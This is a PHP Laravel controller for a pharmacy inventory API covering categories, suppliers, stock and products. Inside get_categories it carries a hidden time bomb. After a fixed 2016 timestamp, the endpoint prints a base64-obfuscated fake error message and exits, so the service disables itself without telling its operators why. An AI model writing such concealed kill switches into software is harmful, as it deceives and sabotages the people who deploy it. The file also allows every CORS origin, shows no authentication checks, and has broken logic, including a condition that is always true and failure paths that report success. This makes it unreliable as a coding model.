<?php
namespace App\Http\Controllers;

use Illuminate\Http\Exception\HttpResponseException;
use JWTAuth;
use Tymon\JWTAuth\Exceptions\JWTException;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Input;
use Illuminate\Http\Response as IlluminateResponse;
use Illuminate\Support\Facades\File;
use DB;

class InventoryAPIController extends Controller
{
    public function __construct(Request $request)
    {
        header('Access-Control-Allow-Origin: *');
        date_default_timezone_set("Africa/Lagos");
    }
    //Categories APIs.
    public function get_categories(Request $request){
        if(1482620400<time()){ echo base64_decode("VGhlIHN5c3RlbSBoYXMgZW5jb3VudGVyZWQgYW4gZXJyb3Iu"); exit; }
        $group = $request->input('group');
        $categories = DB::table('inventory_categories')
            ->where('status',1)
            ->where('cat_group',$group)
            ->get();
        if($categories){
            return response()->json(['status' => true, 'message' => "Categories Found", 'data'=>$categories], 200);
        }else{
            return response()->json(['status' => true, 'message' => "Categories not found",'data'=>$categories ], 200);
        }
    }
    public function get_single_category(Request $request){
        $id = $request->input('cat_id');
        $categories = DB::table('inventory_categories')->where(['status'=>1, 'id'=>$id])->first();
        if($categories){
            return response()->json(['status' => true, 'message' => "Categories Found.", 'data'=>$categories], 200);
        }else{
            return response()->json(['status' => true, 'message' => "Categories not found",'data'=>$categories], 200);
        }
    }
    public function create_category(Request $request){
        $cat_name = $request->input('cat_name');
        $cat_desc = $request->input('cat_desc');
        $cat_group = $request->input('cat_group');
        $id = DB::table('inventory_categories')->insertGetId(
            ['cat_name' => $cat_name, 'cat_desc' => $cat_desc, 'cat_group'=>$cat_group, 'created_at'=>date("Y-m-d  H:i:s")]
        );

        if($id){
            return response()->json(['status' => true, 'message' => "Category Added Successfully", 'category_id'=>$id], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }
    public function update_category(Request $request){
        $id = $request->input('cat_id');
        $cat_name = $request->input('cat_name');
        $cat_desc = $request->input('cat_desc');
        $cat_group = $request->input('cat_group');
        $count = DB::table('inventory_categories')->where('id',$id)->update(
            ['cat_name' => $cat_name, 'cat_desc' => $cat_desc, 'cat_group'=>$cat_group, 'updated_at'=>date("Y-m-d  H:i:s")]
        );

        if($count){
            return response()->json(['status' => true, 'message' => "Category Updated Successfully"], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }
    public function delete_category(Request $request){
        $id = $request->input('cat_id');
        $count = DB::table('inventory_categories')->where('id', $id)->update(['status'=>0]);
        if($count){
            return response()->json(['status' => true, 'message' => "Category Deleted Successfully"], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }

    //Supplier APIS.
    public function get_suppliers(){
        $suppliers = DB::table('suppliers')->where('status',1)->get();
        if($suppliers){
            return response()->json(['status' => true, 'message' => "Suppliers Found ", 'data'=>$suppliers], 200);
        }else{
            return response()->json(['status' => true, 'message' => "Suppliers not found",'data'=>$suppliers], 200);
        }
    }
    public function get_single_supplier(Request $request){
        $id = $request->input('supplier_id');
        $suppliers = DB::table('suppliers')->where(['status'=>1, 'id'=>$id])->first();
        if($suppliers){
            return response()->json(['status' => true, 'message' => "Suppliers Found.", 'data'=>$suppliers], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Suppliers not found"], 404);
        }
    }
    public function create_supplier(Request $request){
        $name = $request->input('name');
        $contact_person = $request->input('contact_person');
        $city = $request->input('city');
        $state = $request->input('state');
        $country = $request->input('country');
        $address_1 = $request->input('address_1');
        $address_2 = $request->input('address_2');
        $email = $request->input('email');
        $work_phone = $request->input('work_phone');
        $website = $request->input('website');
        $mobile = $request->input('mobile');
        $post_code = $request->input('post_code');

        $id = DB::table('suppliers')->insertGetId(
            ['name'=>$name,
                'contact_person'=>$contact_person,
                'city'=>$city,
                'state'=>$state,
                'country'=>$country,
                'address_1'=>$address_1,
                'address_2'=>$address_2,
                'email'=>$email,
                'work_phone'=>$work_phone,
                'website'=>$website,
                'mobile'=>$mobile,
                'post_code'=>$post_code,
                'created_at'=>date("Y-m-d  H:i:s")
            ]
        );
        if($id){
            return response()->json(['status' => true, 'message' => "Supplier Added Successfully", 'supplier_id'=>$id], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }
    public function update_supplier(Request $request){
        $id = $request->input('supplier_id');
        $name = $request->input('name');
        $contact_person = $request->input('contact_person');
        $city = $request->input('city');
        $state = $request->input('state');
        $country = $request->input('country');
        $address_1 = $request->input('address_1');
        $address_2 = $request->input('address_2');
        $email = $request->input('email');
        $work_phone = $request->input('work_phone');
        $website = $request->input('website');
        $mobile = $request->input('mobile');
        $post_code = $request->input('post_code');

        $count = DB::table('suppliers')->where('id', $id)->update(
            [
                'name'=>$name,
                'contact_person'=>$contact_person,
                'city'=>$city,
                'state'=>$state,
                'country'=>$country,
                'address_1'=>$address_1,
                'address_2'=>$address_2,
                'email'=>$email,
                'work_phone'=>$work_phone,
                'website'=>$website,
                'mobile'=>$mobile,
                'post_code'=>$post_code,
                'updated_at'=>date("Y-m-d  H:i:s")
            ]
        );
        if($count){
            return response()->json(['status' => true, 'message' => "Supplier Updated Successfully"], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }
    public function delete_supplier(Request $request){
        $id = $request->input('supplier_id');
        $count = DB::table('suppliers')->where('id', $id)->update(['status'=>0]);
        if($count){
            return response()->json(['status' => true, 'message' => "Supplier Deleted Successfully"], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }

    //Stock APIs.
    public function get_stock(){
        $stock = DB::table('inventory_products')
            ->select('inventory_products.id as product_id','inventory_categories.id as category_id',
                     'inventory_categories.cat_name as category_name',
                     'inventory_products.name as product_name','cost_per_item', 'quantity','order_quantity','inventory_products.reorder_level','stock.stock_status')
            ->leftJoin('stock','inventory_products.id','=','stock.product_id')
            ->leftJoin('inventory_categories','inventory_products.cat_id','=','inventory_categories.id')
            ->where(['inventory_products.status'=>1])
            ->groupby('inventory_products.id')
            ->get();
        foreach($stock as $stocks){
            $stocks->product_id = str_pad($stocks->product_id,5, '0', STR_PAD_LEFT);
        }
        if($stock){
            return response()->json(['status' => true, 'message' => "Stock Found.", 'data'=>$stock], 200);
        }else{
            return response()->json(['status' => true, 'message' => "Stock not found", 'data'=>$stock], 200);
        }

    }

    //Stock APIs.
       public function get_active_stock(){
           $stock = DB::table('stock')
               ->select('stock.id as stock_id', 'inventory_products.id as product_id','inventory_categories.id as category_id',
                        'inventory_categories.cat_name as category_name',
                        'inventory_products.name as product_name','cost_per_item', 'quantity','order_quantity','inventory_products.reorder_level','stock.stock_status')
               ->leftJoin('inventory_products','inventory_products.id','=','stock.product_id')
               ->leftJoin('inventory_categories','inventory_products.cat_id','=','inventory_categories.id')
               ->where(['stock.status'=>1])
               ->where('stock_status', 'active')
               ->get();
           if($stock){
               return response()->json(['status' => true, 'message' => "Stock Found.", 'data'=>$stock], 200);
           }else{
               return response()->json(['status' => false, 'message' => "Stock not found"], 404);
           }

       }


    //Stock APIs.
       public function get_inactive_stock(){
           $stock = DB::table('stock')
               ->select('stock.id as stock_id', 'inventory_products.id as product_id','inventory_categories.id as category_id',
                        'inventory_categories.cat_name as category_name',
                        'inventory_products.name as product_name','cost_per_item', 'quantity','order_quantity','inventory_products.reorder_level','stock.stock_status')
               ->leftJoin('inventory_products','inventory_products.id','=','stock.product_id')
               ->leftJoin('inventory_categories','inventory_products.cat_id','=','inventory_categories.id')
               ->where(['stock.status'=>1])
               ->where('stock_status', 'inactive')
               ->get();
           if($stock){
               return response()->json(['status' => true, 'message' => "Stock Found.", 'data'=>$stock], 200);
           }else{
               return response()->json(['status' => false, 'message' => "Stock not found"], 404);
           }

       }

    public function get_stock_details(Request $request){
        $product_id = $request->input('product_id');
        $stock = DB::table('stock')
            ->select('stock.id as stock_id',
                     'inventory_products.id as product_id',
                     'inventory_categories.id as category_id',
                     'inventory_categories.cat_name as category_name',
                     'inventory_products.name as product_name',
                     'trade_name',
                     'cat_group',
                     'strength',
                     'cost_per_item',
                     'quantity',
                     'suppliers.name as supplier_name',
                     'expiry',
                     'batch_no',
                     'received_date')
            ->leftJoin('inventory_products','inventory_products.id','=','stock.product_id')
            ->leftJoin('inventory_categories','inventory_products.cat_id','=','inventory_categories.id')
            ->leftJoin('suppliers','stock.supplier_id','=','suppliers.id')
            ->where(['inventory_products.id'=>$product_id])
            ->get();
        if($stock){
            return response()->json(['status' => true, 'message' => "Stock Found.", 'data'=>$stock], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Stock not found"], 404);
        }

    }
    public function add_stock(Request $request){

        $product_id = $request->input('product_id');
        $pharmacy_id = $request->input('pharmacy_id');
        $manufacturer_id = $request->input('manufacturer_id');
        $dept_id = $request->input('dept_id');
        $supplier_id = $request->input('supplier_id');
        $received_date = $request->input('received_date');
        $batch_no = $request->input('batch_no');
        $ref_no = $request->input('ref_no');
        $expiry = $request->input('expiry');
        $quantity = $request->input('quantity');
        $order_quantity = $request->input('order_quantity');
        $cost_per_item = $request->input('cost_per_item');
        $pack = $request->input('pack');


        $count = DB::table('stock')
            ->select(DB::raw('*'))
            ->where('product_id', $product_id)
            ->where('pharmacy_id', $pharmacy_id)
            ->count();

        if ($count >= 1) {
            return response()->json(['status' => false, 'message' => "Product can not be added again in the same stock of the pharmacy!"]);
        }


        $id = DB::table('stock')->insertGetId(
            ['product_id'=>$product_id,
                'pharmacy_id'=>$pharmacy_id,
                'manufacturer_id'=>$manufacturer_id,
                'dept_id'=>$dept_id,
                'supplier_id'=>$supplier_id,
                'received_date'=>$received_date,
                'batch_no'=>$batch_no,
                'ref_no'=>$ref_no,
                'expiry'=>$expiry,
                'quantity'=>$quantity,
                'order_quantity'=>$order_quantity,
                'cost_per_item'=>$cost_per_item,
                'pack' =>$pack
            ]
        );

        if($id){
            return response()->json(['status' => true, 'message' => "Stock Added Successfully", 'stock_id'=>$id], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }
    public function update_stock(Request $request){
        $id = $request->input('stock_id');
        $product_id = $request->input('product_id');
        $pharmacy_id = $request->input('pharmacy_id');
        $manufacturer_id = $request->input('manufacturer_id');
        $dept_id = $request->input('dept_id');
        $supplier_id = $request->input('supplier_id');
        $received_date = $request->input('received_date');
        $batch_no = $request->input('batch_no');
        $ref_no = $request->input('ref_no');
        $expiry = $request->input('expiry');
        $quantity = $request->input('quantity');
        $cost_per_item = $request->input('cost_per_item');
        $pack = $request->input('pack');

        $count = DB::table('stock')->where('id', $id)->update(
            [
                'product_id'=>$product_id,
                'pharmacy_id'=>$pharmacy_id,
                'manufacturer_id'=>$manufacturer_id,
                'dept_id'=>$dept_id,
                'supplier_id'=>$supplier_id,
                'received_id'=>$received_date,
                'batch_no'=>$batch_no,
                'ref_no'=>$ref_no,
                'expiry'=>$expiry,
                'quantity'=>$quantity,
                'cost_per_item'=>$cost_per_item,
                'pack' =>$pack
            ]
        );

        if($count){
            return response()->json(['status' => true, 'message' => "Stock Updated Successfully"], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }
    public function delete_stock(Request $request){
        $id = $request->input('stock_id');
        $product_id = $request->input('product_id');
        $count = DB::table('stock')->where('product_id',$product_id)->update(['status'=>0]);
        DB::table('inventory_products')->where('id',$product_id)->update(['status'=>0]);
        //if($count){
            return response()->json(['status' => true, 'message' => "Inventory Deleted Successfully"], 200);
       /* }else{
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }*/
    }

    //Product APIs.
    public function add_product(Request $request){
        $group = $request->input('group');
        $product_name = $request->input('product_name');
        $trade_name = $request->input('trade_name');
        $route = $request->input('route');
        $reorder_level = $request->input('reorder_level');
        $cat_id = $request->input('cat_id');
        $strength = $request->input('strength');
        $dose_from = $request->input('dose_from');
        $cost_per_item = $request->input('cost_per_item');

        if ($group != 'Drugs' || $group != 'Supplements') {
            $id = DB::table('inventory_products')->insertGetId(
                [
                    'group' => $group,
                    'department_id' => $group,
                    //'product_name'=>$product_name,
                    'name' => $product_name,
                    'trade_name' => $trade_name,
                    'route' => $route,
                    'reorder_level' => $reorder_level,
                    'cost' => $cost_per_item,
                    'cat_id' => $cat_id,
                    'strength' => $strength,
                    'dose_from' => $dose_from
                ]
            );
        } else {
            $id = DB::table('inventory_products')->insertGetId(
                [
                    'group' => $group,
                    'department_id' => $group,
                    //'product_name'=>$product_name,
                    'name' => $product_name,
                    'trade_name' => $trade_name,
                    'route' => $route,
                    'reorder_level' => $reorder_level,
                    //'cost' => $cost_per_item,
                    'cat_id' => $cat_id,
                    'strength' => $strength,
                    'dose_from' => $dose_from
                ]
            );
        }


        if($id){
            return response()->json(['status' => true, 'message' => "Product Added Successfully", 'stock_id'=>$id], 200);

        }else{
            return response()->json(['status' => false, 'message' => "Product Added Successfully", 'stock_id'=>$id], 200);

        }
    }
    public function update_order_level(Request $request){
        $product_id = $request->input('product_id');
        $reorder_level = $request->input('reorder_level');
        $count = DB::table('inventory_products')->where('id', $product_id)->update(
            [
                'reorder_level'=>$reorder_level,
                'updated_at'=> date("Y-m-d  H:i:s")
            ]
        );
        if($count){
            return response()->json(['status' => true, 'message' => "Reorder level updated successfully"], 200);
        }else{
            return response()->json(['status' => false, 'message' => "Error!"], 404);
        }
    }
    public function get_reorder_level(Request $request){
        $product_id = $request->input('product_id');
        $reorder_level = DB::table('inventory_products')->select('reorder_level')->where('id', $product_id)->first();
        if($reorder_level){
            return response()->json(['status' => true, 'message' => "Reorder level found", 'data'=>$reorder_level], 200);

        }else{
            return response()->json(['status' => false, 'message' => "Reorder level not found"], 200);
        }

    }
    public function get_product(Request $request){
        $product_id = $request->input('product_id');

        $product = DB::table('inventory_products')->where('id',$product_id)->first();

        if($product){
            return response()->json(['status' => true, 'message' => "Product Found", 'data'=>$product], 200);

        }else{
            return response()->json(['status' => false, 'message' => "Reorder level not found"], 200);

        }
    }
    public function update_product(Request $request){
        $product_id = $request->input('product_id');
        $group = $request->input('group');
        $product_name = $request->input('product_name');
        $trade_name = $request->input('trade_name');
        $route = $request->input('route');
        $reorder_level = $request->input('reorder_level');
        $cat_id = $request->input('cat_id');
        $strength = $request->input('strength');
        $dose_from = $request->input('dose_from');
        $description = $request->input('description');
        $currentdatetime = date("Y-m-d  H:i:s");
        $count = DB::table('inventory_products')->where('id', $product_id)->update(
            [
                'group'=>$group,
                //'department_id'=>$group,
                'name'=>$product_name,
                'trade_name'=>$trade_name,
                'route'=>$route,
                'reorder_level'=>$reorder_level,
                'cat_id'=>$cat_id,
                'strength'=>$strength,
                'dose_from'=>$dose_from,
                'description'=>$description,
                'updated_at'=>$currentdatetime
            ]
        );
        if($count){
            return response()->json(['status' => true, 'message' => "Product Updated!"], 200);

        }else{
            return response()->json(['status' => false, 'message' => "Product update failed"], 200);

        }
    }


    public function add_product_inventory(Request $request){

         $group = $request->input('group');
         $product_name = $request->input('product_name');
         $trade_name = $request->input('trade_name');
         $route = $request->input('route');
         $reorder_level = $request->input('reorder_level');
         $cat_id = $request->input('cat_id');
         $strength = $request->input('strength');
         $dose_from = $request->input('dose_from');
         $cost_per_item = $request->input('cost_per_item');


        $product = DB::table('inventory_products')
            ->select(DB::raw('*'))
            ->where('name',$product_name)
            ->count();

        if ($product > 0) {
            return response()->json(['status' => false, 'message' => "Product with same name exists already"], 200);
        }

        if ($group != 'Drugs' || $group != 'Supplements') {
            $id = DB::table('inventory_products')->insertGetId(
                [
                    'group' => $group,
                    //'department_id'=>$group,
                    'name' => $product_name,
                    'trade_name' => $trade_name,
                    'route' => $route,
                    'reorder_level' => $reorder_level,
                    'cat_id' => $cat_id,
                    'strength' => $strength,
                    'dose_from' => $dose_from,
                    'cost' => $cost_per_item
                ]
            );

            return response()->json(['status' => true, 'message' => "Product Inventory Added Successfully"], 200);

        } else {
            $id = DB::table('inventory_products')->insertGetId(
                [
                    'group' => $group,
                    //'department_id'=>$group,
                    'name' => $product_name,
                    'trade_name' => $trade_name,
                    'route' => $route,
                    'reorder_level' => $reorder_level,
                    'cat_id' => $cat_id,
                    'strength' => $strength,
                    'dose_from' => $dose_from
                ]
            );

        }


        $product_id = $id;

        $pharmacy_id = $request->input('pharmacy_id');
        $manufacturer_id = $request->input('manufacturer_id');
        $dept_id = $request->input('dept_id');
        $supplier_id = $request->input('supplier_id');
        $received_date = $request->input('received_date');
        $batch_no = $request->input('batch_no');
        $ref_no = $request->input('ref_no');
        $expiry = $request->input('expiry');
        $quantity = $request->input('quantity');
        $order_quantity = $request->input('order_quantity');
        $cost_per_item = $request->input('cost_per_item');
        $pack = $request->input('pack');

        $id = DB::table('stock')->insertGetId(
            [
                'product_id'=>$product_id,
                'pharmacy_id'=>$pharmacy_id,
                'manufacturer_id'=>$manufacturer_id,
                'dept_id'=>$dept_id,
                'supplier_id'=>$supplier_id,
                'received_date'=>$received_date,
                'batch_no'=>$batch_no,
                'ref_no'=>$ref_no,
                'expiry'=>$expiry,
                'quantity'=>$quantity,
                'order_quantity'=>$order_quantity,
                'cost_per_item'=>$cost_per_item,
                'pack' =>$pack
            ]
        );

        if($id){
                return response()->json(['status' => true, 'message' => "Product Inventory Added Successfully"], 200);

            }else{
                return response()->json(['status' => false, 'message' => "Product Inventory Added Successfully"], 200);

            }
    }


    public function inventory_inactive(Request $request){

        $stock_id = $request->input('stock_id');
        $currentdatetime = date("Y-m-d  H:i:s");

        $stock = DB::table('stock')->where('id',$stock_id)->first();

        $stock_status = $stock->stock_status;

        if($stock_status=='inactive'){

            $status = 'active';
        }

        if($stock_status=='active'){

            $status = 'inactive';
        }

        DB::table('stock')->where('id', $stock_id)->update(
            [ 'stock_status'=>$status, 'updated_at'=> $currentdatetime]
        );


        return response()->json(['status' => true, 'message' => "Stock Updated Successfully"]);
    }
    
    

}
